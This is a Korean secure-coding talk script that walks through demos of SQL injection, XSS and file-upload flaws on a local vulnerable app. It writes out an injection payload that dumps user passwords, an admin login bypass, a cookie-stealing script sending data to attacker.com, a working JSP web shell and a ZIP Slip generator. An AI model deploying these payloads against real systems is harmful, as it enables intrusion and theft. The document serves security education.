# 시연 순서 가이드

발표 목차 기준으로 데모 앱을 어떤 순서로 시연하면 좋은지 정리한 문서입니다.

---

## 1. 발표 배경 (2분) — 슬라이드만, 데모 없음

**목적:** 청중이 "이게 왜 중요한가"를 느끼게 만드는 구간

**추천 사례 (슬라이드에 삽입):**

| 연도 | 사고 | 취약점 | 피해 |
|------|------|--------|------|
| 2014 | 한국카드 3사 개인정보 유출 | 내부자 + 접근통제 부재 | 1억 400만 건 |
| 2017 | Equifax (미국 신용평가사) | Apache Struts SQL Injection | 1억 4700만 명 |
| 2020 | 솔라윈즈 공급망 공격 | 코드 수준 백도어 | 미국 정부기관 다수 |
| 2021 | Log4Shell (Log4j) | 입력값 검증 미흡 (JNDI Injection) | 전 세계 수억 대 서버 |

**핵심 멘트:**
> "Equifax 해킹은 패치가 이미 나와 있었지만 적용하지 않은 것이 아닙니다.
> 공개된 취약점을 코드에서 직접 만들었습니다. 개발자가 입력값을 검증하지 않은 코드 한 줄이 시작이었습니다."

---

## 2. 시큐어코딩이란 (2분) — 슬라이드만, 데모 없음

**목적:** 개념 정립. "프레임워크가 해주지 않는가?"라는 질문에 미리 답하는 구간

**버그 vs 취약점 구분 (슬라이드):**

```
버그       → 의도하지 않은 동작  (기능 오류)
취약점     → 공격자가 악용 가능한 동작  (보안 위협)

모든 취약점은 버그지만, 모든 버그가 취약점은 아닙니다.
```

**수정 비용 비교 (NIST 기준, 슬라이드):**

```
설계 단계  : 1
개발 단계  : 10
테스트 단계: 100
운영 이후  : 1,000~10,000
```

**"Spring Security 쓰면 해결되지 않나요?" 선제 답변:**
> "Spring Security는 누가 어디에 접근할 수 있는지를 제어합니다.
> 오늘 다룰 취약점들은 로그인한 사용자가 코드를 어떻게 악용하는지의 문제입니다.
> 층이 다릅니다. 지금 바로 보여드리겠습니다."

→ 이 멘트를 끝으로 바로 브라우저 열기

---

## 3. 주요 취약점 (8분) — 핵심 시연 구간

> 브라우저에서 `http://localhost:8080` 열어둔 상태에서 시작

---

### 3-1. SQL Injection (3분)

**시연 순서:**

**① 정상 동작 확인 (30초)**
1. `/demo/sql-injection` 이동
2. 검색창에 `배송` 입력 → 정상 결과 확인
3. "이 검색 기능이 어떻게 구현되어 있는지 코드를 보겠습니다" → 코드 블록 가리키기

**② 검색 SQL Injection 공격 (1분)**
1. 취약 검색창에 `%' OR '1'='1` 붙여넣기 (복사 버튼 활용)
2. 실행 → 비밀글 포함 전체 게시글 노출 확인
3. `%' UNION SELECT 1,user_id,user_password,user_name,user_email,user_gender,0 FROM user_tb --` 입력
4. 실행 → DB의 모든 계정/비밀번호 노출 확인
5. "쿼리 구조 자체가 바뀐 겁니다"

**③ 로그인 우회 공격 (30초)**
1. 취약 로그인에 ID = `admin' --`, PW = `아무거나` 입력
2. 실행 → admin 로그인 성공 확인
3. "비밀번호가 없어도 관리자로 로그인됩니다"

**④ 방어 코드 확인 (1분)**
1. 안전 검색창에 동일한 공격 문자열 입력
2. 실행 → 0개 행 반환, 공격 실패 확인
3. "PreparedStatement 한 줄로 막힙니다" → 코드 비교 가리키기

---

### 3-2. XSS (2분 30초)

**시연 순서:**

**① Stored XSS 공격 (1분)**
1. `/demo/xss` 이동
2. 취약 댓글창에 `<script>alert('XSS!')</script>` 붙여넣기 (복사 버튼 활용)
3. 등록 → 즉시 alert 팝업 확인
4. "이 스크립트는 이 페이지를 여는 모든 사람에게 실행됩니다"
5. 쿠키 탈취 페이로드 입력: `<script>fetch('http://attacker.com?c='+document.cookie)</script>`
6. "실제로는 공격자 서버로 세션 쿠키가 전송됩니다"

**② Reflected XSS (30초)**
1. 취약 반사형 폼에 `<script>alert(1)</script>` 입력
2. 전송 → alert 실행 확인
3. "URL 파라미터에 스크립트가 들어가 있습니다. 이 URL을 피해자에게 보내면 됩니다"

**③ 방어 확인 (1분)**
1. 안전 댓글창에 동일한 스크립트 입력
2. 등록 → 스크립트가 텍스트로 그대로 출력됨 확인
3. "`th:text` 하나로 막힙니다" → 코드 비교 가리키기
4. 댓글 초기화 버튼 클릭

---

### 3-3. 파일 업로드 (2분 30초)

**시연 순서:**

**① 사전 준비 — 악성 파일 생성 (시연 전 미리 준비)**

바탕화면에 아래 두 파일을 미리 만들어둡니다.

`webshell.jsp` 내용:
```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    InputStream is = p.getInputStream();
    int c; while((c = is.read()) != -1) out.print((char)c);
%>
```

`zipslip.zip` 생성 (Python 터미널에서 실행):
```python
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success!')
zf.writestr('normal.txt', 'normal file')
zf.close()
```

**② 취약 업로드 — .jsp 웹쉘 (1분)**
1. `/demo/file-upload` 이동
2. 취약 업로드에 `webshell.jsp` 선택 → 업로드
3. 저장 경로 확인 (`uploads/999/webshell.jsp`)
4. "확장자 검사가 없으면 실행 가능한 파일이 그대로 서버에 올라갑니다"
5. "이 서버는 Spring Boot 내장 Tomcat이라 JSP가 실행되지 않습니다. 실제 환경에서는 실행됩니다."

**③ ZIP Slip 공격 (1분)**
1. 취약 ZIP 해제 섹션에 `zipslip.zip` 선택 → 해제
2. 결과에서 실제 저장 경로 확인 (`../../uploads/pwned.txt` → 압축 해제 디렉토리 밖)
3. "화이트리스트로 .zip을 허용해도 이 공격은 통과합니다"
4. 안전 ZIP 해제에 동일한 파일 업로드 → BLOCKED 확인

**④ 방어 확인 (30초)**
1. 안전 업로드에 `webshell.jsp` 선택 → 업로드
2. "Disallowed file type" 차단 확인
3. 코드 비교 가리키기

---

## 4. 방어 도구 (2분) — 슬라이드만, 데모 없음

**SAST vs DAST 비교 (슬라이드):**

```
SAST (정적 분석)
  - 코드를 실행하지 않고 소스 분석
  - 도구: SonarQube, Checkmarx, SpotBugs
  - 장점: 개발 단계에서 조기 발견
  - 단점: 오탐(False Positive) 많음 → 개발자가 무시하게 됨

DAST (동적 분석)
  - 실행 중인 앱에 실제 공격 시도
  - 도구: OWASP ZAP, Burp Suite
  - 장점: 실제 동작 기반 → 미탐 적음
  - 단점: 커버리지 한계, 늦은 발견
```

**핵심 멘트:**
> "도구가 잡아주는 것에만 의존하면 안 됩니다.
> 오늘 본 것처럼 PreparedStatement를 쓸지, th:text를 쓸지는
> 결국 개발자의 습관과 코드 리뷰에서 결정됩니다."

---

## 5. 마무리 (1분) — 슬라이드만, 데모 없음

**제로트러스트 한 줄 정의 (슬라이드):**
> "아무것도 신뢰하지 않는다. 내부 네트워크도, 인증된 사용자도, 프레임워크도."

**OWASP Top 10 연결 (슬라이드):**

| 오늘 다룬 취약점 | OWASP Top 10 (2021) |
|-----------------|---------------------|
| SQL Injection | A03 — Injection |
| XSS | A03 — Injection |
| 파일 업로드 | A04 — Insecure Design |
| 경로 순회 / ZIP Slip | A01 — Broken Access Control |

**마지막 멘트:**
> "OWASP Top 10은 매년 업데이트됩니다.
> 오늘 본 취약점들은 2003년부터 목록에 있었고, 아직도 목록에 있습니다.
> 새로운 프레임워크가 나와도 개발자가 코드를 잘못 짜면 그대로 남습니다."

---

## 시연 전 체크리스트

- [ ] `http://localhost:8080` 정상 접속 확인
- [ ] MySQL 서버 실행 중 확인
- [ ] `webshell.jsp` 바탕화면에 준비
- [ ] `zipslip.zip` 바탕화면에 준비 (Python으로 생성)
- [ ] 브라우저 확대 비율 125~150% (청중 가시성)
- [ ] 복사 버튼 동작 확인 (HTTPS 아닌 경우 Clipboard API 안 될 수 있음)
- [ ] 댓글 초기화 버튼으로 XSS 데모 초기 상태 복원

---

## 복사 버튼이 동작하지 않을 때

로컬(`http://`) 환경에서는 브라우저 보안 정책으로 Clipboard API가 막힐 수 있습니다.

해결 방법:
- Chrome 주소창에 `chrome://flags/#unsafely-treat-insecure-origin-as-secure` 입력
- `http://localhost:8080` 추가 후 재시작

또는 Firefox 사용 시 로컬호스트는 기본 허용됩니다.
